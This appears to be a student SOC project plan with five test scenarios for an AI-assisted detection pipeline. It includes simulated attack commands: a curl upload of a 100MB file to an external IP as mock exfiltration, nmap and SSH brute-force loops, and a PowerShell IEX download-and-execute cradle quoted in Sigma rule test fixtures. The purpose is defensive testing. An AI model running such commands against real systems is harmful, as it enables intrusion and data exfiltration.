# Advanced Testing Scenarios for Detection-as-Code Pipeline

## Overview

These five tests demonstrate the full capabilities of your AI-powered Detection-as-Code pipeline, from anomaly detection to automated response. Each test is **feasible** and can be implemented within your 21-week timeline.

---

## Test A: Anomaly Detection (ML-Powered)

### What It Tests
- ML model detects unusual network behavior
- Integration between Security Onion → Wazuh → Your ML API
- Real-time anomaly scoring

### Implementation

#### 1. Setup (Week 9-10)
```bash
# Ensure ML model is trained on normal traffic patterns
cd ml-detection/training
python train_network_anomaly.py --data-source zeek_logs
```

#### 2. Simulation Script
```bash
# File: scripts/test-a-anomaly-detection.sh
#!/bin/bash

echo "=== Test A: Anomaly Detection ==="

# Simulate large file transfer (100MB to external IP)
WORKSTATION_IP="192.168.60.50"
EXTERNAL_IP="8.8.8.8"
FILE_SIZE="100M"

# Generate large file
dd if=/dev/urandom of=/tmp/test_exfil.bin bs=1M count=100

# Transfer to external IP (simulated)
echo "Simulating data exfiltration: $WORKSTATION_IP -> $EXTERNAL_IP"
curl -X POST http://$EXTERNAL_IP/upload \
  --data-binary @/tmp/test_exfil.bin \
  --max-time 60 || echo "Transfer simulated (expected to fail)"

# Wait for detection
sleep 30

# Check Security Onion captured the traffic
echo "Checking Security Onion Zeek logs..."
ssh security-onion "grep '$EXTERNAL_IP' /nsm/zeek/logs/current/conn.log | tail -5"

# Check Wazuh received alert
echo "Checking Wazuh alerts..."
curl -u admin:admin https://aziz-wazuh:55000/alerts \
  -k -G --data-urlencode "q=data.dstip=$EXTERNAL_IP"

# Check ML API flagged as anomaly
echo "Checking ML detection..."
kubectl logs -n detection-pipeline -l app=wazuh-connector --tail=50 | grep "is_anomaly.*true"
```

#### 3. Expected Results
```json
{
  "alert_id": "1234",
  "rule_description": "Large data transfer detected",
  "ml_enrichment": {
    "is_anomaly": true,
    "confidence": 0.95,
    "reason": "Unusual bytes_sent: 104857600 (normal: ~5000)"
  },
  "forwarded_to_shuffle": true
}
```

#### 4. Validation Checklist
- [ ] Security Onion Zeek logs show connection to external IP
- [ ] Wazuh alert generated with rule ID
- [ ] ML API scored alert with confidence >0.7
- [ ] Alert forwarded to Shuffle
- [ ] TheHive case created automatically

**Feasibility**: ✅ **High** - All components already exist. Just need to wire them together.

---

## Test B: LLM Triage (Alert Storm Management)

### What It Tests
- LLM summarizes multiple related alerts
- Prioritization based on context
- Reduces analyst workload

### Implementation

#### 1. Add LLM Integration to Shuffle
```python
# File: integrations/llm-triage/main.py
import openai
import os

OPENAI_API_KEY = os.getenv('OPENAI_API_KEY')
openai.api_key = OPENAI_API_KEY

def triage_alerts(alerts: list) -> dict:
    """Use LLM to summarize and prioritize alert storm"""
    
    # Prepare context for LLM
    alert_summary = "\n".join([
        f"- {a['rule_description']} from {a['source_ip']} at {a['timestamp']}"
        for a in alerts
    ])
    
    prompt = f"""
    You are a SOC analyst. Analyze these security alerts and provide:
    1. A concise summary (2-3 sentences)
    2. Priority level (Critical/High/Medium/Low)
    3. Recommended action
    4. Related MITRE ATT&CK techniques
    
    Alerts:
    {alert_summary}
    """
    
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}],
        temperature=0.3
    )
    
    return {
        "summary": response.choices[0].message.content,
        "alert_count": len(alerts),
        "time_saved": len(alerts) * 5  # minutes
    }
```

#### 2. Simulation Script
```bash
# File: scripts/test-b-llm-triage.sh
#!/bin/bash

echo "=== Test B: LLM Triage ==="

# Generate alert storm
echo "Generating noisy alerts..."

# 1. Port scan (50 alerts)
for port in {1..50}; do
  nmap -p $port 192.168.60.10 &
done

# 2. Failed logins (20 alerts)
for i in {1..20}; do
  ssh baduser@192.168.60.10 -o PasswordAuthentication=yes -o PubkeyAuthentication=no || true
done

# Wait for alerts to accumulate
sleep 60

# Trigger LLM triage in Shuffle
echo "Triggering LLM triage..."
curl -X POST http://shuffle:3001/api/v1/workflows/llm-triage/execute

# Check results
echo "Checking LLM summary..."
curl http://shuffle:3001/api/v1/workflows/llm-triage/results | jq .
```

#### 3. Expected LLM Output
```
Summary: Coordinated reconnaissance attack detected from 192.168.60.100. 
Attacker performed systematic port scan (50 ports) followed by SSH brute force 
attempts (20 failed logins). High likelihood of automated attack tool.

Priority: HIGH

Recommended Action: 
1. Block source IP at firewall
2. Enable MFA on SSH
3. Review other systems for similar patterns

MITRE ATT&CK:
- T1046 (Network Service Scanning)
- T1110.001 (Brute Force: Password Guessing)
- T1595.001 (Active Scanning: Scanning IP Blocks)
```

#### 4. Shuffle Workflow
```yaml
# File: shuffle-workflows/llm-triage.yaml
name: LLM Alert Triage
trigger: webhook
steps:
  - name: Collect Alerts
    action: wazuh.get_recent_alerts
    params:
      time_range: "5m"
      min_count: 10
  
  - name: LLM Analysis
    action: openai.chat_completion
    params:
      model: "gpt-4"
      prompt: "Analyze these alerts: {{alerts}}"
  
  - name: Create TheHive Case
    action: thehive.create_case
    params:
      title: "{{llm_summary.title}}"
      description: "{{llm_summary.analysis}}"
      severity: "{{llm_summary.priority}}"
      tags: "{{llm_summary.mitre_techniques}}"
```

**Feasibility**: ✅ **Medium-High** - Requires OpenAI API key (free tier available). Shuffle supports LLM integrations.

---

## Test C: Enrichment (Threat Intelligence + LLM)

### What It Tests
- Cortex analyzers enrich IOCs
- LLM provides context and MITRE mapping
- Integration with Amine's MISP

### Implementation

#### 1. Cortex Analyzer Configuration
```yaml
# File: cortex-analyzers/config.json
{
  "analyzers": [
    {
      "name": "VirusTotal_GetReport",
      "enabled": true,
      "api_key": "YOUR_VT_API_KEY"
    },
    {
      "name": "AbuseIPDB",
      "enabled": true,
      "api_key": "YOUR_ABUSEIPDB_KEY"
    },
    {
      "name": "MISP_Query",
      "enabled": true,
      "url": "http://amine-misp:8080",
      "api_key": "MISP_API_KEY"
    }
  ]
}
```

#### 2. LLM Enrichment Function
```python
# File: integrations/llm-enrichment/main.py
def enrich_with_llm(ioc: str, cortex_results: dict) -> dict:
    """Use LLM to contextualize threat intelligence"""
    
    prompt = f"""
    Analyze this security indicator and provide:
    1. Threat context (what is this?)
    2. Associated threat actors
    3. MITRE ATT&CK techniques
    4. Recommended defensive actions
    
    IOC: {ioc}
    
    Threat Intelligence:
    - VirusTotal: {cortex_results['virustotal']['positives']}/70 detections
    - AbuseIPDB: Confidence {cortex_results['abuseipdb']['confidence']}%
    - MISP: {cortex_results['misp']['tags']}
    """
    
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )
    
    return {
        "llm_context": response.choices[0].message.content,
        "enrichment_sources": ["VirusTotal", "AbuseIPDB", "MISP", "GPT-4"]
    }
```

#### 3. Simulation Script
```bash
# File: scripts/test-c-enrichment.sh
#!/bin/bash

echo "=== Test C: Threat Intelligence Enrichment ==="

# Suspicious IP (known malicious)
SUSPICIOUS_IP="185.220.101.1"  # Known Tor exit node

# Submit to Cortex for analysis
echo "Submitting to Cortex analyzers..."
curl -X POST http://cortex:9001/api/analyzer/run \
  -H "Authorization: Bearer $CORTEX_API_KEY" \
  -d '{
    "data": "'$SUSPICIOUS_IP'",
    "dataType": "ip",
    "analyzers": ["VirusTotal_GetReport", "AbuseIPDB", "MISP_Query"]
  }'

# Wait for analysis
sleep 30

# Get results
CORTEX_RESULTS=$(curl http://cortex:9001/api/job/results/$JOB_ID)

# Send to LLM for contextualization
echo "Enriching with LLM..."
curl -X POST http://localhost:8001/enrich \
  -d "{\"ioc\": \"$SUSPICIOUS_IP\", \"cortex_results\": $CORTEX_RESULTS}"
```

#### 4. Expected Output
```json
{
  "ioc": "185.220.101.1",
  "cortex_enrichment": {
    "virustotal": {"positives": 12, "total": 70},
    "abuseipdb": {"confidence": 95, "reports": 234},
    "misp": {"tags": ["tor", "anonymizer", "suspicious"]}
  },
  "llm_context": {
    "threat_type": "Tor Exit Node",
    "description": "This IP is a Tor network exit node commonly used for anonymization. While Tor has legitimate uses, it's frequently abused by threat actors to hide their origin.",
    "threat_actors": ["APT groups", "Ransomware operators", "Data exfiltration"],
    "mitre_techniques": [
      "T1090.003 (Proxy: Multi-hop Proxy)",
      "T1071.001 (Application Layer Protocol: Web Protocols)"
    ],
    "recommended_actions": [
      "Block Tor exit nodes at perimeter firewall",
      "Monitor for other Tor connections from internal network",
      "Investigate why internal host contacted Tor network"
    ]
  }
}
```

**Feasibility**: ✅ **High** - Cortex is part of TheHive ecosystem (Dali's responsibility). You just add LLM layer.

---

## Test D: Detection Engineering (AI-Assisted Rule Creation)

### What It Tests
- LLM generates Sigma rules from incident description
- LLM proposes test cases
- CI/CD validates and deploys rule

### Implementation

#### 1. LLM Rule Generator
```python
# File: integrations/llm-detection-engineer/main.py
def generate_sigma_rule(incident_description: str) -> dict:
    """Use LLM to create Sigma rule from incident"""
    
    prompt = f"""
    You are a detection engineer. Create a Sigma rule for this incident:
    
    {incident_description}
    
    Provide:
    1. Complete Sigma rule in YAML format
    2. Three test cases (2 should trigger, 1 should not)
    3. Expected false positive scenarios
    """
    
    response = openai.ChatCompletion.create(
        model="gpt-4",
        messages=[{"role": "user", "content": prompt}]
    )
    
    return parse_llm_response(response.choices[0].message.content)
```

#### 2. Simulation Workflow
```bash
# File: scripts/test-d-detection-engineering.sh
#!/bin/bash

echo "=== Test D: AI-Assisted Detection Engineering ==="

# Incident description
INCIDENT="Attacker used PowerShell to download malware from pastebin.com and execute it. Process: powershell.exe, CommandLine: IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/abc123')"

# Ask LLM to create Sigma rule
echo "Generating Sigma rule with LLM..."
curl -X POST http://localhost:8002/generate-rule \
  -d "{\"incident\": \"$INCIDENT\"}" \
  -o /tmp/new_rule.json

# Extract rule and tests
cat /tmp/new_rule.json | jq -r '.sigma_rule' > detection-rules/sigma/malware/pastebin_download.yml
cat /tmp/new_rule.json | jq -r '.test_cases' > detection-rules/tests/test_pastebin_download.py

# Commit to Git (triggers CI/CD)
cd detection-rules
git add sigma/malware/pastebin_download.yml tests/test_pastebin_download.py
git commit -m "Add Pastebin malware download detection (LLM-generated)"
git push

# GitHub Actions runs tests automatically
echo "Waiting for CI/CD pipeline..."
sleep 60

# Check if deployed
kubectl get configmap sigma-rules -o yaml | grep pastebin_download
```

#### 3. LLM-Generated Sigma Rule
```yaml
title: Malicious PowerShell Download from Pastebin
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects PowerShell downloading and executing code from Pastebin
author: LLM-Assisted Detection Engineering
date: 2025/12/12
tags:
    - attack.execution
    - attack.t1059.001
    - attack.command_and_control
    - attack.t1102.001
logsource:
    product: windows
    service: sysmon
    category: process_creation
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - 'DownloadString'
            - 'pastebin.com'
    condition: selection
falsepositives:
    - Legitimate administrative scripts (rare)
level: high
```

#### 4. LLM-Generated Test Cases
```python
# File: tests/test_pastebin_download.py
def test_pastebin_malware_download_detected():
    """Should trigger: PowerShell + DownloadString + pastebin.com"""
    log = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/abc123')"
    }
    assert rule_matches(log, "pastebin_download.yml") == True

def test_pastebin_legitimate_script():
    """Should trigger: Even legitimate use is suspicious"""
    log = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "Get-Content https://pastebin.com/raw/config.txt"
    }
    assert rule_matches(log, "pastebin_download.yml") == True

def test_normal_powershell_no_trigger():
    """Should NOT trigger: Normal PowerShell without Pastebin"""
    log = {
        "Image": "C:\\Windows\\System32\\powershell.exe",
        "CommandLine": "Get-Process | Where-Object {$_.CPU -gt 10}"
    }
    assert rule_matches(log, "pastebin_download.yml") == False
```

**Feasibility**: ✅ **High** - LLM is excellent at generating structured data like Sigma rules. CI/CD already in place.

---

## Test E: SOAR Playbook (Automated Response)

### What It Tests
- Shuffle triggers automated response
- Velociraptor collects forensic artifacts
- Host isolation via network policy

### Implementation

#### 1. Shuffle Playbook
```yaml
# File: shuffle-workflows/auto-isolate-host.yaml
name: Auto-Isolate Compromised Host
trigger: 
  type: webhook
  condition: alert.ml_confidence > 0.9 AND alert.severity == "critical"

steps:
  - name: Verify Alert
    action: wazuh.get_alert_details
    params:
      alert_id: "{{trigger.alert_id}}"
  
  - name: Get Host Info
    action: wazuh.get_agent_info
    params:
      agent_id: "{{alert.agent_id}}"
  
  - name: Isolate Host (Network)
    action: pfsense.add_firewall_rule
    params:
      action: "block"
      source: "{{host.ip_address}}"
      destination: "any"
      description: "Auto-isolation: Alert {{alert_id}}"
  
  - name: Collect Forensics (Velociraptor)
    action: velociraptor.collect_artifacts
    params:
      client_id: "{{host.velociraptor_id}}"
      artifacts: [
        "Windows.KapeFiles.Targets",
        "Windows.System.ProcessInfo",
        "Windows.Network.NetstatEnriched",
        "Windows.EventLogs.RDPAuth"
      ]
  
  - name: Create TheHive Case
    action: thehive.create_case
    params:
      title: "Auto-Isolated Host: {{host.hostname}}"
      description: "Host isolated due to {{alert.rule_description}}"
      severity: 3
      tags: ["auto-response", "isolated", "{{alert.mitre_technique}}"]
      observables: [
        {"type": "ip", "value": "{{host.ip_address}}"},
        {"type": "hostname", "value": "{{host.hostname}}"}
      ]
  
  - name: Notify SOC Team
    action: email.send
    params:
      to: "soc-team@hospital.local"
      subject: "URGENT: Host {{host.hostname}} Auto-Isolated"
      body: "See TheHive case #{{case.id}} for details"
```

#### 2. Velociraptor Collection Script
```python
# File: integrations/velociraptor-automation/main.py
import pyvelociraptor
import os

VELO_CONFIG = os.getenv('VELOCIRAPTOR_CONFIG', '/etc/velociraptor/api.config.yaml')

def collect_artifacts(client_id: str, artifacts: list) -> str:
    """Trigger artifact collection via Velociraptor API"""
    
    config = pyvelociraptor.LoadConfigFile(VELO_CONFIG)
    
    # Create collection
    flow_id = pyvelociraptor.create_collection(
        config=config,
        client_id=client_id,
        artifacts=artifacts,
        ops_per_second=1000,
        timeout=3600
    )
    
    return flow_id
```

#### 3. Simulation Script
```bash
# File: scripts/test-e-auto-isolation.sh
#!/bin/bash

echo "=== Test E: SOAR Automated Response ==="

# Simulate critical alert (ransomware encryption)
COMPROMISED_HOST="192.168.60.50"
AGENT_ID="001"

echo "Simulating ransomware activity on $COMPROMISED_HOST..."
curl -X POST http://wazuh:55000/alerts \
  -u admin:admin \
  -d '{
    "agent_id": "'$AGENT_ID'",
    "rule_id": "100002",
    "rule_description": "Ransomware file encryption detected",
    "severity": "critical",
    "data": {
      "srcip": "'$COMPROMISED_HOST'",
      "process": "ransomware.exe",
      "files_encrypted": 1337
    },
    "ml_confidence": 0.98
  }'

# Wait for Shuffle to process
sleep 10

# Verify host isolation
echo "Checking firewall rules..."
ssh pfsense "pfctl -sr | grep $COMPROMISED_HOST"

# Verify Velociraptor collection
echo "Checking Velociraptor collections..."
curl -X GET http://velociraptor:8000/api/v1/GetClientFlows/$AGENT_ID \
  -H "Authorization: Bearer $VELO_API_KEY" | jq '.items[0]'

# Verify TheHive case created
echo "Checking TheHive case..."
curl http://thehive:9000/api/case/_search \
  -u admin:admin \
  -d '{"query": {"_string": "Auto-Isolated"}}' | jq .
```

#### 4. Expected Results
```json
{
  "playbook_execution": {
    "trigger_time": "2025-12-12T04:30:00Z",
    "steps_completed": 6,
    "total_duration": "45s",
    "results": {
      "host_isolated": true,
      "firewall_rule_id": "auto_block_192.168.60.50",
      "velociraptor_flow_id": "F.C001.1234567890",
      "artifacts_collected": 4,
      "thehive_case_id": "AWX-2025-001234",
      "notification_sent": true
    }
  },
  "forensic_artifacts": {
    "collection_status": "in_progress",
    "artifacts": [
      "Windows.KapeFiles.Targets (15GB)",
      "Windows.System.ProcessInfo (234 processes)",
      "Windows.Network.NetstatEnriched (89 connections)",
      "Windows.EventLogs.RDPAuth (1,234 events)"
    ],
    "estimated_completion": "2025-12-12T05:15:00Z"
  }
}
```

**Feasibility**: ✅ **Medium** - Requires Velociraptor setup (already in your architecture). Shuffle playbooks are straightforward.

---

## Implementation Timeline

### Week 11-12: Test A (Anomaly Detection)
- [ ] Train ML model on real Zeek logs
- [ ] Create simulation script
- [ ] Verify end-to-end detection

### Week 13-14: Test B (LLM Triage)
- [ ] Get OpenAI API key
- [ ] Build LLM integration in Shuffle
- [ ] Test with alert storm

### Week 15-16: Test C (Enrichment)
- [ ] Configure Cortex analyzers
- [ ] Build LLM enrichment layer
- [ ] Test with known malicious IOCs

### Week 17-18: Test D (Detection Engineering)
- [ ] Build LLM rule generator
- [ ] Integrate with CI/CD pipeline
- [ ] Generate 5 rules from real incidents

### Week 19-20: Test E (SOAR Playbook)
- [ ] Build Shuffle auto-isolation playbook
- [ ] Configure Velociraptor artifact collection
- [ ] Test end-to-end response

### Week 21: Integration Testing
- [ ] Run all 5 tests in sequence
- [ ] Record demos for presentation
- [ ] Document results

---

## Resource Requirements

### APIs Needed
- **OpenAI API**: $5-20/month (for LLM features)
- **VirusTotal API**: Free tier (4 requests/min)
- **AbuseIPDB API**: Free tier (1000 requests/day)

### Team Dependencies
- **Yessine**: Zeek logs for ML training (Test A)
- **Aziz**: Wazuh API access (All tests)
- **Amine**: MISP API access (Test C)
- **Dali**: TheHive + Cortex setup (Test C, E)

### Hardware Impact
- **CPU**: +10% for LLM API calls
- **RAM**: +2GB for Velociraptor client
- **Network**: Minimal (API calls only)

---

## Success Metrics

| Test       | Metric                | Target                 |
| ---------- | --------------------- | ---------------------- |
| **Test A** | ML detection accuracy | >90%                   |
| **Test B** | Alert reduction       | 100 alerts → 1 summary |
| **Test C** | Enrichment time       | <30 seconds            |
| **Test D** | Rule deployment time  | <2 minutes             |
| **Test E** | Response time         | <60 seconds            |

---

## Academic Value

### Why These Tests Are Impressive

1. **Test A**: Shows ML actually works (not just theory)
2. **Test B**: Demonstrates AI reducing analyst workload
3. **Test C**: Proves integration with threat intelligence
4. **Test D**: Shows AI assisting human detection engineers
5. **Test E**: Demonstrates full SOAR automation

### Presentation Structure (20 minutes)

```
Slide 1-5: Architecture Overview (5 min)
Slide 6-10: Live Demo Test A + B (5 min)
Slide 11-15: Live Demo Test C + D (5 min)
Slide 16-20: Live Demo Test E + Results (5 min)
```

---

## Feasibility Summary

| Test  | Feasibility | Complexity | Time to Implement | Dependencies                |
| ----- | ----------- | ---------- | ----------------- | --------------------------- |
| **A** | ✅ High      | Low        | 1 week            | Yessine (Zeek logs)         |
| **B** | ✅ High      | Medium     | 1 week            | OpenAI API key              |
| **C** | ✅ High      | Medium     | 1 week            | Dali (Cortex), Amine (MISP) |
| **D** | ✅ High      | Medium     | 1 week            | OpenAI API key              |
| **E** | ⚠️ Medium    | High       | 2 weeks           | Velociraptor setup          |

**Overall**: ✅ **All tests are feasible** within your 21-week timeline. Tests A-D are straightforward. Test E requires more setup but is achievable.

---

## Recommendation

**Implement in this order**:
1. **Test A** (Week 11-12) - Easiest, proves ML works
2. **Test D** (Week 13-14) - High impact, shows AI-assisted engineering
3. **Test B** (Week 15-16) - Demonstrates practical value
4. **Test C** (Week 17-18) - Shows threat intel integration
5. **Test E** (Week 19-20) - Grand finale, full automation

This gives you **progressive complexity** and ensures you have at least 3 working tests even if time runs short.

**Minimum Viable Demo**: Tests A + D (proves ML + AI-assisted detection)
**Full Demo**: All 5 tests (comprehensive showcase)
